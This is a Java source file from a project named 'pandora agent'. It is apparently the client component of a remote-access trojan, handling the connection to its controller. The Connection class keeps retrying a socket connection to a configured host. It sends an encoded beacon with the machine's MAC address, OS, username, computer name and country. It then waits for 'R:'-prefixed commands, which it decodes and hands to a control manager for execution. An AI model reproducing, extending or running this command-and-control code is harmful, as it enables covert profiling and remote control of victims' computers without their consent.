package org.pandora.agent.socket.connection;

import lombok.Getter;
import lombok.Setter;
import org.pandora.agent.Client;
import org.pandora.agent.runnable.ExecutorRunnable;
import org.pandora.agent.socket.SocketManager;
import org.pandora.agent.utils.Computer;
import org.pandora.agent.utils.Settings;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.InetAddress;
import java.net.Socket;
import java.net.SocketException;
import java.net.UnknownHostException;
import java.nio.charset.StandardCharsets;

public class Connection {

    @Getter
    private final Client client;
    @Getter
    @Setter
    private boolean connected;
    @Getter
    private final SocketManager socketManager;
    @Getter
    private PrintWriter printWriter;

    public Connection(final Client client, final SocketManager socketManager) {
        this.connected = false;
        this.socketManager = socketManager;
        this.client = client;
        new ExecutorRunnable(this).start();
    }

    public void connect(final int mode) {
        while (!this.isConnected()) this.tryToConnect(mode);
    }

    private void tryToConnect(final int mode) {
        final Computer computer = this.client.getComputer();
        try {
            final Socket socket = new Socket(this.getRealHost(), this.getSocketManager().getPort());
            this.connected = true;
            final PrintWriter printWriter = new PrintWriter(socket.getOutputStream());
            this.printWriter = printWriter;
            printWriter.println("A-SRV:" + new String((this.client.getEncodingManager().encode(computer.getIdentifier())).getBytes(StandardCharsets.UTF_8)) + ":" + new String((this.client.getEncodingManager().encode(mode + ":" + computer.getMacAddress() + ":" + computer.getOs() + ":" + computer.getUsername() + ":" + computer.getComputer() + ":" + computer.getCountry() + ":" + Settings.VERSION.replace(":", ""))).getBytes(StandardCharsets.UTF_8)));
            printWriter.flush();
            final InputStreamReader inputStreamReader = new InputStreamReader(socket.getInputStream());
            final BufferedReader bufferedReader = new BufferedReader(inputStreamReader);
            while (true) {
                try {
                    final String line = bufferedReader.readLine();
                    if ((line == null) || line.equalsIgnoreCase("RESTART")) {
                        this.connected = false;
                        socket.close();
                        return;
                    }
                    if (line.startsWith("R:") && this.client.getControlManager() != null)
                        this.client.getControlManager().read(this, new String((this.client.getDecodingManager().decode(line.replaceFirst("R:", "")).getBytes(StandardCharsets.UTF_8))), socket);
                } catch (final SocketException ignored) {
                    this.connected = false;
                    return;
                }
                if (socket.isClosed()) {
                    this.connected = false;
                    return;
                }
            }
        } catch (final IOException ignore) {
            this.connected = false;
        }
    }

    private String getRealHost() {
        final String host = this.getSocketManager().getAddress();
        try {
            return InetAddress.getByName(host).getHostAddress();
        } catch (final UnknownHostException ignore) {
            return host;
        }
    }
}
